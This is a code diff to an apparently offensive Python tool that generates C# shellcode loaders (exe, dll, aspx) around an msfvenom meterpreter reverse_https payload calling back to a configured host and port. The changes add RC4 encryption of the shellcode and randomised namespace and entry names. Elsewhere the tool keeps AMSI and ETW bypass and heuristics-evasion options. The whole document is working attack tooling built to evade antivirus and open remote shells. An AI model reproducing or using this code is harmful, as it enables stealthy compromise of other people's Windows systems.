@@ -1,15 +1,22 @@
 #!/bin/env python3
 import ak
 import os
+import re
+import random
 import subprocess
 import argparse
 
 MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
-XOR_KEY = b'\x09'
 
-CS_NAMESPACE = "LeMans"
+# TODO: Make dynamic
+XOR_KEY = b'\x09'
+RC4_KEY = b'aaaaaaaaaaaaaaaa'
+
+# Randomize namespace and entrypoint names
+WORDS = open("/usr/share/dict/words").read().splitlines()
+CS_NAMESPACE = re.sub(r'\W+', '', random.choice(WORDS))
 CS_CLASSNAME = "Class1"
-CS_ENTRY_DLL = "ferrari"
+CS_ENTRY_DLL = re.sub(r'\W+', '', random.choice(WORDS))
 
 templates = {
   'cs': """
@@ -47,6 +54,7 @@ namespace {cs_namespace}
 class Stager:
   def __init__(self,args):
     self.args = args
+    self.encrypt = args.encrypt
 
     self.shellcode_fn = self.args.output + '.sc'
 
@@ -82,7 +90,10 @@ class Stager:
 
   def generate_shellcode(self):
     print(f"Generating shellcode with: {MSFVENOM_CMD}")
-    self.shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
+    if self.encrypt == 'xor':
+      self.shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
+    elif self.encrypt == 'rc4':
+      self.shellcode = ak.ShellCode(MSFVENOM_CMD, rc4_key=RC4_KEY)
 
   def generate_source(self):
     url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)
@@ -96,14 +107,19 @@ class Stager:
     # Add staged or stageless code
     if self.args.stageless and self.shellcode is not None:
       # Stageless
-      main_code = ak.SC_HARDCODED.format(xor_shellcode=self.shellcode.get_hex_csharp())
+      main_code = ak.SC_HARDCODED.format(enc_shellcode=self.shellcode.get_hex_csharp())
     else:
       # Staged
       main_code = f"""{url_dl_code}"""
 
-    # Append XOR decoder
-    # TODO: Allow changing encryption types
-    main_code += ak.SC_XOR_DECODER.format(xor_key=self.shellcode.get_key_csharp())
+    if self.encrypt == 'xor':
+      main_code += ak.SC_XOR_DECODER.format(enc_key=self.shellcode.get_key_csharp())
+    elif self.encrypt == 'rc4':
+      imports += ak.RC4_DECRYPT_IMPORT
+      main_code += ak.SC_RC4_DECODER.format(enc_key=self.shellcode.get_key_ascii())
+    else:
+      print("Invalid encryption format")
+      sys.exit()
 
     if self.args.heuristics:
       imports += f"{ak.HEURISTICS_IMPORT}"
@@ -173,6 +189,7 @@ def main():
   parser = argparse.ArgumentParser()
   parser.add_argument('--injection', '-i', default='standard', choices=ak.main_choices.keys())
   parser.add_argument('--format', '-f', default='exe', choices=['exe', 'dll', 'aspx'])
+  parser.add_argument('--encrypt', '-e', default='xor', choices=['xor', 'rc4'])
   parser.add_argument('--heuristics', default=True, action='store_true')
   parser.add_argument('--amsi', default=False, action='store_true')
   parser.add_argument('--etw', default=True, action='store_true')
